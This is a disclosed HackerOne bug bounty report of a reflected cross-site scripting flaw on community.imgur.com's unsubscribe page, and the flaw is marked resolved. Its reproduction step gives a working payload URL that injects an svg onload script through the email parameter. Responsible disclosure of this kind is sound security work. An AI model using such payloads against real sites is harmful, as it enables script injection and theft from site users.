---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '274868'
original_report_id: '274868'
title: Xss on community.imgur.com
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: imgur
created_at: '2017-10-05T19:50:04.936Z'
disclosed_at: '2019-09-03T19:15:32.956Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 20
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Xss on community.imgur.com

## Metadata

- HackerOne Report ID: 274868
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: imgur
- Disclosed At: 2019-09-03T19:15:32.956Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello __Team__

**Description:** 
I found a reflected cross site scripting on community.imgur.com
## Steps To Reproduce:
Visit
`https://community.imgur.com/email/unsubscribed?email=email@gmail.com%27%22%3E%3Csvg/onload=alert(document.domain)%3E`

{F226739}

__Regards__
Santhosh

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
